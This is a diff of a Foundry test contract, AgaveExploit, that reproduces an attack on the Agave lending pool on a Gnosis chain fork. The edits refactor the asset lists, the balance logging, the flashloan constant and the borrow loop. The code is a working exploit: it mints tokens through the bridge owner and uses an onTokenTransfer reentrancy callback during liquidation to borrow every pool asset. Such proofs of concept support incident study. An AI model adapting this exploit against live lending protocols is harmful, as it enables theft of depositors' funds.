@@ -42,7 +42,7 @@ Note: These concise steps outline the specific actions taken in each phase of th
 
 contract AgaveExploit is Test {
     //Prepare numbers
-    uint256 linkLendNum1 = 1_000_000_000_000_000_100;
+    uint256 linkLendNum1 = 1.0000000000000002 ether;
     uint256 wethlendnum2 = 1;
     uint256 linkDebt3 = 0.7 ether;
     uint256 wethDebt4 = 1;
@@ -60,6 +60,11 @@ contract AgaveExploit is Test {
     address usdc = 0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83;
     address wxdai = 0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d;
 
+    // Array of assets with weth at the end
+    address[] assetAddrs;
+    string[] assetNames = ["USDC", "GNO", "LINK", "WBTC", "WXDAI", "WETH", "aWETH"];
+    uint8[] assetDecimals = [6, 18, 18, 8, 18, 18, 18];
+
     address provider = 0xA91B9095eFa6C0568467562032202108e49c9Ef8;
     //Address that can mint tokens on gnosis bridge
     address tokenOwner = 0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d;
@@ -71,7 +76,7 @@ contract AgaveExploit is Test {
     // Contract / exchange interfaces
     ILendingPool lendingPool;
 
-    uint256 ethFlashloanAmt = 2730 ether;
+    uint256 ethFlashloanAmt = 2728.934387414251504146 ether + 1;
 
     modifier balanceLog() {
         _logBalances("Before hack balances");
@@ -97,12 +102,15 @@ contract AgaveExploit is Test {
     ) internal {
         console.log(message);
         console.log("--- Start of balances ---");
-        emit log_named_decimal_uint("WETH Balance", _getTokenBal(weth), 18);
-        emit log_named_decimal_uint("aWETH Balance", _getTokenBal(aweth), 18);
-        emit log_named_decimal_uint("USDC Balance", _getTokenBal(usdc), 6);
-        emit log_named_decimal_uint("GNO Balance", _getTokenBal(gno), 18);
-        emit log_named_decimal_uint("LINK Balance", _getTokenBal(link), 18);
-        emit log_named_decimal_uint("WBTC Balance", _getTokenBal(wbtc), 8);
+        
+        for (uint i = 0; i < assetAddrs.length; i++) {
+            emit log_named_decimal_uint(
+                string.concat(assetNames[i], " Balance"), 
+                _getTokenBal(assetAddrs[i]), 
+                assetDecimals[i]
+            );
+        }
+        
         emit log_named_decimal_uint("healthf", _getHealthFactor(), 18);
         console.log("--- End of balances ---");
     }
@@ -111,12 +119,25 @@ contract AgaveExploit is Test {
         vm.createSelectFork("gnosis", 21_120_283); //fork gnosis at block number 21120319
         lendingPool = ILendingPool(ILendingPoolAddressesProvider(provider).getLendingPool());
         wethLiqBeforeHack = _getAvailableLiquidity(weth);
+
+        // Initialize asset array
+        assetAddrs = new address[](7);
+        assetAddrs[0] = usdc;
+        assetAddrs[1] = gno;
+        assetAddrs[2] = link;
+        assetAddrs[3] = wbtc;
+        assetAddrs[4] = wxdai;
+        assetAddrs[5] = weth;
+        assetAddrs[6] = aweth;
+
         //Lets just mint weth to this contract for initial debt
         vm.startPrank(tokenOwner);
+        
         //Mint initial weth funding
-        WETH.mint(address(this), 2728.934387414251504146 ether + 1);
+        WETH.mint(address(this), ethFlashloanAmt);
         // Mint LINK funding
         LINK.mint(address(this), linkLendNum1);
+
         vm.stopPrank();
 
         //Approve funds
@@ -196,20 +217,18 @@ contract AgaveExploit is Test {
 
     //NOTE: boostLTVHack deposits weth from flashloan to increase health and borrows wethliqbeforehack at the end
     function borrowTokens() internal boostLTVHack {
-        _borrow(usdc);
-        _borrow(link);
-        _borrow(wbtc);
-        _borrow(gno);
-        _borrow(wxdai);
+        // Borrow all assets except weth (which is at index 5)
+        for (uint i = 0; i < 5; i++) {
+            _borrow(assetAddrs[i]);
+        }
     }
 
     function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
-        //we only do the borrow call on liquidation call which is the second time the from is weth and value is 1
         if (_from == aweth && _value == 1) {
             callCount++;
-        }
-        if (callCount == 2 && _from == aweth && _value == 1) {
-            borrowTokens();
+            if (callCount == 2) {
+                borrowTokens();
+            }
         }
     }
 }
